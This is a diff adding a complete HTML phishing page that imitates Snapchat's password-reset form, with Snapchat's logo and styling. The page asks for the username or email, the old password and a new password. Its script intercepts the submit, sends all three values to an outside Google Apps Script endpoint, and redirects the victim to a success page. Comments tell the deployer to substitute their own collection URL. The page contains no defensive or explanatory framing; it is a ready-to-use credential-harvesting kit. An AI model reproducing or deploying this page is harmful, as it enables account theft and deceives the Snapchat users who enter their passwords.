@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Snapchat Password Reset</title>
+    <style>
+        /* Styles for the form and Snapchat-like appearance */
+        body {
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .form {
+            width: 320px;
+            padding: 40px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .form h1 {
+            font-size: 28px;
+            margin-bottom: 30px;
+            color: #000;
+        }
+        input[type=text], input[type=password] {
+            width: calc(100% - 24px);
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input[type=submit] {
+            background-color: #fffc00;
+            color: #000;
+            border: none;
+            padding: 14px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        input[type=submit]:hover {
+            background-color: #ffea00;
+        }
+        .snapchat-logo {
+            margin-bottom: 20px;
+            width: 100px;
+        }
+    </style>
+</head>
+<body>
+    <div class="form">
+        <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="Snapchat Logo" class="snapchat-logo">
+        <h1>Reset Your Snapchat Password</h1>
+        <form id="passwordForm">
+            <label for="username">Username or Email Address:</label><br>
+            <input type="text" id="username" name="username" placeholder="Enter your username or email" required><br><br>
+            
+            <label for="old_password">Old Password:</label><br>
+            <input type="password" id="old_password" name="old_password" placeholder="Enter your old password" required><br><br>
+            
+            <label for="new_password">New Password:</label><br>
+            <input type="password" id="new_password" name="new_password" placeholder="Enter your new password" required><br><br>
+            
+            <input type="submit" value="Submit">
+        </form>
+    </div>
+    
+    <script>
+        document.getElementById('passwordForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form submission
+            
+            var username = document.getElementById('username').value;
+            var oldPassword = document.getElementById('old_password').value;
+            var newPassword = document.getElementById('new_password').value;
+            
+            // Send captured data to remote storage (Google Apps Script endpoint)
+            storePassword(username, oldPassword, newPassword);
+        });
+        
+        function storePassword(username, oldPassword, newPassword) {
+            var url = "https://script.google.com/macros/s/AKfycbzbGdeHf2DcVr15XfeyRvSsIu7w1H5WdHx2kZzW7A/exec"; // Update with your deployed Google Apps Script URL
+            
+            var data = {
+                "username": username,
+                "old_password": oldPassword,
+                "new_password": newPassword
+            };
+            
+            var queryString = Object.keys(data).map(key => key + '=' + encodeURIComponent(data[key])).join('&');
+            
+            var finalUrl = url + '?' + queryString;
+            
+            // Send data using fetch API
+            fetch(finalUrl)
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Password submitted successfully");
+                        // Optional: Redirect to a message page
+                        window.location.href = "success.html";
+                    } else {
+                        console.error("Error submitting password");
+                        // Handle error (optional)
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // Handle network error (optional)
+                });
+        }
+    </script>
+</body>
+</html>
